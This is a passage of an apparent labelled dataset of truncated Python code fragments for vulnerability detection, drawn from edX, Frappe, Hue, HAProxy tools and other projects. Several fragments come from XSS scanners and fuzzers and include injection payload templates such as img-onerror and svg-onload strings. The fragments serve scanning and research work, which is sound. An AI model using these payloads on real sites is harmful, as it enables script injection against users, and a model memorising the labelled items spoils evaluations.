XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact", "label": 0}, {"snippet_id": 23838, "code": "{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store", "label": 0}, {"snippet_id": 40855, "code": "\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance", "label": 0}, {"snippet_id": 48154, "code": "+\"' and cropped it. The resulting PK is \" +str(m.pk)) def action_add_single_media(request: HttpRequest): try: headline=request.POST[\"headline\"] category=request.POST[\"category\"] text=request.POST[\"text", "label": 0}, {"snippet_id": 287, "code": "./Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers[", "label": 0}, {"snippet_id": 4366, "code": "</script>\" def img(self): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload", "label": 1}, {"snippet_id": 40523, "code": "\"Percent\"): \t\t\t\tself._precision[cache_key][fieldname]=get_field_precision(df, self) \t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value", "label": 0}, {"snippet_id": 12756, "code": ".get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r", "label": 0}, {"snippet_id": 47842, "code": ".objects.get(pk=pid) user.displayName=displayname user.dect=dect user.notes=notes user.rights=rights user.number_of_allowed_reservations=int(request.POST[\"allowed_reservations\"]) if request.POST.get(\"active", "label": 1}, {"snippet_id": 9752, "code": ".course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'", "label": 0}, {"snippet_id": 46147, "code": " False), 'mobile': is_mobile, }) def index_m(request): return index(request, True) def new_search(request): engine=request.GET.get('engine', 'solr') collections=get_engine(request.user, engine).datasets()", "label": 0}, {"snippet_id": 42633, "code": ".modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get", "label": 0}, {"snippet_id": 4800, "code": " <!DOCTYPE html> <html> <head> <title>XSS Fuzzer</title> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> </head> <body> %s </body> </html> ''' _probes=[ \"\"\"'';!--\"<XSS>=&{()}\"\"\", ", "label": 0}, {"snippet_id": 28083, "code": " @handler.unsupported_on_local_server @handler.require_csrf_token @handler.get(handler.HTML) def get(self): \"\"\"Handle a get request.\"\"\" try: auth.revoke_session_cookie(auth.get_session_cookie()) except", "label": 0}, {"snippet_id": 21766, "code": ", 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 22110, "code": "*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views.render_500", "label": 0}, {"snippet_id": 31781, "code": "=\"margin:0\">'+form.getvalue('color')+' list was created</div>') \texcept IOError as e: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n create new '+form.getvalue('color')+' list. %s </div", "label": 0}, {"snippet_id": 17768, "code": "'auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views", "label": 0}, {"snippet_id": 43259, "code": "\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit(self): \t\t \t\tdb_values=frappe.get_doc(self.doctype,", "label": 0}, {"snippet_id": 52364, "code": "], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2", "label": 0}, {"snippet_id": 44938, "code": "\") @check_document_access_permission() def submit_workflow(request, doc_id): workflow=Workflow(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request", "label": 0}, {"snippet_id": 48721, "code": ".GET[\"rid\"])) +\\ '&srid=' +str(int(request.GET['srid']))) else: response=HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"]))) else: return HttpResponseRedirect(\"/admin?error", "label": 0}, {"snippet_id": 47694, "code": ".add_content(PlainText(get_csrf_form_element(http_request))) f.add_content(SubmitButton()) a='<div class=\"w3-row w3-padding-64 w3-twothird w3-container admin-popup\">' a +=f.render_html(http_request) a +=\"</div", "label": 0}, {"snippet_id": 9872, "code": "'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', ", "label": 0}, {"snippet_id": 16323, "code": "'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id", "label": 0}, {"snippet_id": 46392, "code": "(collection['template']['extracode']) if collection: if collection['id']: dashboard_doc=Document2.objects.get(id=collection['id']) else: dashboard_doc=Document2.objects.create(name=collection['name'], uuid", "label": 0}, {"snippet_id": 32288, "code": ".realpath(args.directory) hostname='0.0.0.0' if args.external else 'localhost' server_address=(hostname, args.port) s=Server(server_address, top_level) origin='http://' +hostname if args.port !=80: origin +='", "label": 0}, {"snippet_id": 25366, "code": ") return mark_safe(self.format_output(output)) def format_output(self, rendered_widgets) -> str: return '<div class=\"nameparts-form-group\">%s</div>' % ''.join(rendered_widgets) class NamePartsFormField", "label": 0}, {"snippet_id": 22239, "code": "=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name", "label": 0}, {"snippet_id": 53364, "code": ".content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/bundle_editor.mako', request,{ 'bundle_json':", "label": 1}, {"snippet_id": 28490, "code": ")==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/checker-\"+get_data('logs')+\".log\", \"a\") \telif kwargs.get('metrics')==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open", "label": 0}, {"snippet_id": 37247, "code": "\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate", "label": 0}, {"snippet_id": 46702, "code": ", form): selected_flags=[] for question in entry_form_config: flag=form.cleaned_data.get(str(question['id']), False) if flag: selected_flags.append(getattr(BenefitRequirement.flags, build_question_flag", "label": 0}, {"snippet_id": 33323, "code": "'/api') ) prpc_server=prpc.Server() prpc_server.add_interceptor(auth.prpc_interceptor) prpc_server.add_service(access.AccessServicer()) prpc_server.add_service(api.BuildsApi()) routes +=prpc_server.get_routes", "label": 0}, {"snippet_id": 49582, "code": "=None): self.object_list=object_list self.model=object_list.model self.query_params=query_params or{} self.list_display=list_display or[] self.list_filter=list_filter or[] self.list_search=list_search or[]", "label": 0}, {"snippet_id": 4752, "code": "'onsearch', 'onseeked', 'onseeking', 'onselect', 'onselectionchange', 'onselectstart', 'onstalled', 'onstorage', 'onsubmit', 'onsuspend', 'ontimeupdate', 'ontoggle', 'ontouchcancel', 'ontouchend', 'ontouchmove", "label": 0}, {"snippet_id": 20482, "code": ".get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg", "label": 0}, {"snippet_id": 2408, "code": " import time import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload()", "label": 0}, {"snippet_id": 9046, "code": ">[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course", "label": 0}, {"snippet_id": 52712, "code": " workflow_json=json.loads(request.POST.get('workflow', '{}')) workflow=Workflow(workflow=workflow_json) response['status']=0 response['xml']=workflow.to_xml() except Exception, e: response['message']=str", "label": 0}, {"snippet_id": 23120, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P", "label": 0}, {"snippet_id": 8268, "code": ".provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$',", "label": 0}, {"snippet_id": 19817, "code": " processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See", "label": 0}, {"snippet_id": 30298, "code": ")) \t if serv is not None and act==\"stats\": \timport requests \tfrom requests_toolbelt.utils import dump \t \thaproxy_user=sql.get_setting('stats_user') \thaproxy_pass=sql.get_setting('stats_password') \tstats_port", "label": 0}, {"snippet_id": 40267, "code": ") \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field", "label": 0}, {"snippet_id": 15181, "code": " DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir", "label": 0}, {"snippet_id": 41858, "code": " and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__", "label": 0}, {"snippet_id": 24289, "code": "=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir ", "label": 0}, {"snippet_id": 30542, "code": "\tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \tapache_log_path=sql.get_setting('apache_log_path') \t \tif grep is not None: \t\tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \t\t", "label": 0}, {"snippet_id": 31014, "code": ".install_haproxy(master) \t\tfunct.install_haproxy(slave) \t\t \tif form.getvalue('syn_flood')==\"1\": \t\tfunct.syn_flood_protect(master) \t\tfunct.syn_flood_protect(slave) \t \tos.system(\"cp scripts/%s.\" % script) ", "label": 0}, {"snippet_id": 13640, "code": "+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 14493, "code": " settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +", "label": 0}, {"snippet_id": 18916, "code": "'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds'", "label": 0}, {"snippet_id": 3068, "code": " open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content", "label": 0}, {"snippet_id": 40927, "code": " import unicode_literals import frappe from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint", "label": 1}, {"snippet_id": 31743, "code": " if form.getvalue('bwlists_create'): \tlist_name=form.getvalue('bwlists_create').split('.')[0] \tlist_name +='.lst' \tlist=os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue(", "label": 0}, {"snippet_id": 38070, "code": ".category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t", "label": 0}, {"snippet_id": 2957, "code": ".W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request", "label": 0}, {"snippet_id": 24786, "code": "\"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self):", "label": 0}, {"snippet_id": 19196, "code": " a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os", "label": 0}, {"snippet_id": 1395, "code": "': data['impact'], 'name': data['alert'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': vul['Description", "label": 0}, {"snippet_id": 24216, "code": " call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls", "label": 0}, {"snippet_id": 51660, "code": "[DATABASE]} AUTH_PASSWORD_VALIDATORS=[ { 'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator', }, { 'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator', }, ", "label": 0}, {"snippet_id": 7695, "code": "]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url", "label": 1}, {"snippet_id": 18909, "code": ".provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$',", "label": 0}, {"snippet_id": 16980, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 11472, "code": " from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings", "label": 0}, {"snippet_id": 38354, "code": ".name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions", "label": 0}, {"snippet_id": 40111, "code": "(df.get(\"length\")) or cint(default_column_max_length) \t\t\t\tif len(cstr(value)) > max_length: \t\t\t\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype), self.idx) \t\t\t", "label": 0}, {"snippet_id": 32234, "code": " 'Python-Markdown')) import markdown def main(argv): parser=argparse.ArgumentParser(prog='md_browser') parser.add_argument('-p', '--port', type=int, default=8080, help='port to run on(default=%(default", "label": 0}, {"snippet_id": 48253, "code": "\":[], \"pickup_date\": \"\" } ''' def update_reservation_articles(postdict, rid): res: GroupReservation=GroupReservation.objects.get(id=rid) def add_article_action(request: HttpRequest, default_foreward_url", "label": 0}, {"snippet_id": 5866, "code": " %s')\" ''' %(e, t, e) s +='>%s</%s>\\n' %(t, t) return cls.htmlTemplate % s @classmethod def acmehttp01(cls, url): return url +'/.well-known/acme-challenge/?<h1>hi' def img(self, payload): return '<img/onerror", "label": 1}, {"snippet_id": 47250, "code": " Record.create({'title': 'test'}, id_=rec_uuid) db.session.commit() with app.test_request_context(): index_view_url=url_for('recordmetadata.index_view') delete_view_url=url_for('recordmetadata.delete_view')", "label": 1}, {"snippet_id": 18990, "code": ".MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 588, "code": ", '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url==", "label": 0}, {"snippet_id": 10249, "code": ".env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('", "label": 0}, {"snippet_id": 3885, "code": ") decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result", "label": 0}, {"snippet_id": 5, "code": " sendrequest as req import utils.logs as logs import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger(", "label": 0}, {"snippet_id": 38097, "code": ".category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict", "label": 1}, {"snippet_id": 3110, "code": " impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8').encode('ascii','ignore') return decoded_payload def xss_post_method(url", "label": 0}, {"snippet_id": 19474, "code": "=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_3_processes", "label": 0}, {"snippet_id": 45377, "code": "=Coordinator(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid", "label": 0}, {"snippet_id": 3022, "code": "=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers(url", "label": 0}, {"snippet_id": 43815, "code": "\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel", "label": 0}, {"snippet_id": 5338, "code": "'optgroup', 'option', 'output', 'p', 'param', 'picture', 'pre', 'progress', 'q', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'shadow', 'small', 'source', 'spacer', 'span', 'strike', ", "label": 0}, {"snippet_id": 42197, "code": "\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str", "label": 0}, {"snippet_id": 6626, "code": " IdP:s CPU resources if this is set to True. \"\"\" res=self.config.get(self.section, 'verify_request_signatures') return bool(int(res)) @property def status_test_usernames(self): \"\"\" Get list of usernames", "label": 0}, {"snippet_id": 9865, "code": "'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$'", "label": 0}, {"snippet_id": 26070, "code": ".fields.items(): f.required=False f.widget.is_required=False if 'required' in f.widget.attrs: del f.widget.attrs['required'] elif event.settings.invoice_address_company_required and not self.all_optional:", "label": 0}, {"snippet_id": 24539, "code": ".prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo')", "label": 0}, {"snippet_id": 20684, "code": ".reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'", "label": 0}, {"snippet_id": 36785, "code": ".comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[", "label": 0}, {"snippet_id": 29757, "code": "\treturn_files=set() \t \tfor files in glob.glob(os.path.join(dir,'*.'+format)):\t\t\t\t \t\tfile.add(files.split('/')[-1]) \tfiles=sorted(file, reverse=True) \tif format=='cfg': \t\tfor file in files: \t\t\tip=file.split(\"", "label": 0}, {"snippet_id": 42528, "code": "['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c", "label": 0}, {"snippet_id": 54795, "code": "=False) a.author=self.request.user a.save() return super().form_valid(form) class ArticleUpdateView(UserPassesTestMixin, UpdateView): \"\"\"\u5904\u7406\u66f4\u65b0 Article \u65f6\u7684\u8868\u5355\"\"\" model=Article success_url='/' fields=['content", "label": 0}, {"snippet_id": 14477, "code": "'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 3259, "code": "=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\":", "label": 0}, {"snippet_id": 45051, "code": "(user, fs, jt, workflow, mapping): try: submission=Submission(user, workflow, fs, jt, mapping) job_id=submission.run() return job_id except RestException, ex: detail=ex._headers.get('oozie-error-message'", "label": 0}, {"snippet_id": 10105, "code": "=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite", "label": 0}, {"snippet_id": 48259, "code": " ''' def update_reservation_articles(postdict, rid): res: GroupReservation=GroupReservation.objects.get(id=rid) def add_article_action(request: HttpRequest, default_foreward_url: str): forward_url: str", "label": 0}, {"snippet_id": 19206, "code": " expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name", "label": 0}, {"snippet_id": 49957, "code": " necessary) The WebClient resource in this module will handle these requests and act as a gateway to sessions connected over the webclient. \"\"\" import json import re import time from twisted.web import server,", "label": 0}, {"snippet_id": 33973, "code": "\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post", "label": 0}, {"snippet_id": 22433, "code": "\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url", "label": 0}, {"snippet_id": 41436, "code": "\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull", "label": 0}, {"snippet_id": 36978, "code": ") def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route)", "label": 0}, {"snippet_id": 37591, "code": " and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) ", "label": 0}, {"snippet_id": 35126, "code": "(e).split(\"'\")[-2], None \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique", "label": 0}, {"snippet_id": 3352, "code": ", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url", "label": 0}, {"snippet_id": 45140, "code": " coordinator_id: doc=Document2.objects.get(id=coordinator_id) coordinator=Coordinator(document=doc) else: coordinator=Coordinator() api=get_oozie(request.user) credentials=Credentials() try: credentials", "label": 0}, {"snippet_id": 6216, "code": "') @property def logdir(self): \"\"\" Path to CherryPy logfiles(string). Something like '/var/log/idp' maybe. \"\"\" res=self.config.get(self.section, 'logdir') if not res: res=None return res @property def logfile", "label": 0}, {"snippet_id": 33743, "code": "'Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\"", "label": 1}, {"snippet_id": 12679, "code": "\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location", "label": 0}, {"snippet_id": 35744, "code": "\t\t\tcolumn_type=type_map[df.fieldtype][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length: \t\t", "label": 0}, {"snippet_id": 31132, "code": " script) \t \tfunct.ssh_command(master,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip+\" \"+kp]) \tfunct.ssh_command(slave,[\"sudo chmod +x \"+tmp_config_path", "label": 0}, {"snippet_id": 15251, "code": ". default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available", "label": 0}, {"snippet_id": 49450, "code": " self.object_list=object_list def get_title(self): if isinstance(self.model_field, SmartListFilter): return self.model_field.title return super(SmartFilter, self).get_title() def get_values(self): values=", "label": 0}, {"snippet_id": 42579, "code": "\tfieldname, label=str(e).split(\"'\")[-2], None \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0}", "label": 0}, {"snippet_id": 46674, "code": "=super().get_form_kwargs() kwargs['entry_form_config']=entry_form_config question_ids={str(q['id']) for q in entry_form_config} data={ f'{item}': f'{value}' for item, value in self.request.GET.items() if", "label": 0}, {"snippet_id": 41055, "code": " Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe", "label": 0}, {"snippet_id": 42995, "code": " docname, \"docstatus\"))==2): \t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname))) \t\treturn invalid_links, cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import", "label": 0}, {"snippet_id": 26384, "code": ".request, _('Your VAT ID could not be checked, as the VAT checking service of ' 'your country returned an incorrect result. We will therefore ' 'need to charge VAT on your invoice. Please contact support to", "label": 0}, {"snippet_id": 40183, "code": ".get_field(key) \t\t\tdb_value=db_values.get(key) \t\t\tif df and not df.allow_on_submit and(self.get(key) or db_value): \t\t\t\tif df.fieldtype==\"Table\": \t\t\t\t\t \t\t\t\t\t \t\t\t\t\tself_value=len(self.get(key)) \t\t\t\t\tdb_value", "label": 0}, {"snippet_id": 